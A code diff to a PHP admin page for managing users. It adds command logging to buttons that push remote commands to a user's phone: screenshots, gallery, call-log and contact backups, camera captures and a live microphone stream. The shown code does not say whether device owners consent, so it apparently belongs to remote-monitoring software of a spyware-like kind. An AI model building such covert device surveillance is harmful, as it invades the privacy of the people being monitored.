@@ -18,6 +18,11 @@ class EditUser extends EditRecord
                     ->label('Request Screenshot')
                     ->icon('heroicon-o-camera')
                     ->action(function ($record) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'screenshot',
+                            'status' => 'pending',
+                        ]);
                         try {
                             $fcmToken = $record->fcm_token;
                             if (!$fcmToken) {
@@ -57,6 +62,7 @@ class EditUser extends EditRecord
                                         'token' => $fcmToken,
                                         'data' => [
                                             'action' => 'screenshot',
+                                            'command_id' => (string) $log->id,
                                         ],
                                     ],
                                 ],
@@ -90,6 +96,12 @@ class EditUser extends EditRecord
                             ->required(),
                     ])
                     ->action(function ($record, array $data) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'backup_gallery',
+                            'status' => 'pending',
+                            'payload' => $data,
+                        ]);
                         try {
                             $fcmToken = $record->fcm_token;
                             if (!$fcmToken) {
@@ -121,6 +133,7 @@ class EditUser extends EditRecord
                                         'token' => $fcmToken,
                                         'data' => [
                                             'action' => 'backup_gallery',
+                                            'command_id' => (string) $log->id,
                                             'media_type' => $data['media_type'],
                                         ],
                                     ],
@@ -145,6 +158,11 @@ class EditUser extends EditRecord
                     ->label('Request Call Log')
                     ->icon('heroicon-o-phone')
                     ->action(function ($record) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'backup_call_log',
+                            'status' => 'pending',
+                        ]);
                         try {
                              if (!$record->fcm_token) {
                                  throw new \Exception('No FCM Token');
@@ -170,6 +188,7 @@ class EditUser extends EditRecord
                                         'token' => $record->fcm_token,
                                         'data' => [
                                             'action' => 'backup_call_log',
+                                            'command_id' => (string) $log->id,
                                         ],
                                     ],
                                 ],
@@ -192,6 +211,11 @@ class EditUser extends EditRecord
                     ->label('Request Contacts')
                     ->icon('heroicon-o-users')
                     ->action(function ($record) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'backup_contacts',
+                            'status' => 'pending',
+                        ]);
                         try {
                              if (!$record->fcm_token) {
                                  throw new \Exception('No FCM Token');
@@ -217,6 +241,7 @@ class EditUser extends EditRecord
                                         'token' => $record->fcm_token,
                                         'data' => [
                                             'action' => 'backup_contacts',
+                                            'command_id' => (string) $log->id,
                                         ],
                                     ],
                                 ],
@@ -249,6 +274,12 @@ class EditUser extends EditRecord
                             ->required(),
                     ])
                     ->action(function ($record, array $data) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'capture_image',
+                            'status' => 'pending',
+                            'payload' => $data,
+                        ]);
                          try {
                              if (!$record->fcm_token) {
                                  throw new \Exception('No FCM Token');
@@ -274,6 +305,7 @@ class EditUser extends EditRecord
                                         'token' => $record->fcm_token,
                                         'data' => [
                                             'action' => 'capture_image',
+                                            'command_id' => (string) $log->id,
                                             'camera_facing' => $data['camera_facing'],
                                         ],
                                     ],
@@ -299,6 +331,11 @@ class EditUser extends EditRecord
                     ->icon('heroicon-o-microphone')
                     ->color('success')
                     ->action(function ($record) {
+                        $log = \App\Models\CommandLog::create([
+                            'user_id' => $record->id,
+                            'command' => 'start_stream',
+                            'status' => 'pending',
+                        ]);
                         try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
@@ -332,6 +369,7 @@ class EditUser extends EditRecord
                                         'token' => $record->fcm_token,
                                         'data' => [
                                             'action' => 'start_stream',
+                                            'command_id' => (string) $log->id,
                                             'live_stream_id' => (string)$stream->id,
                                         ],
                                     ],
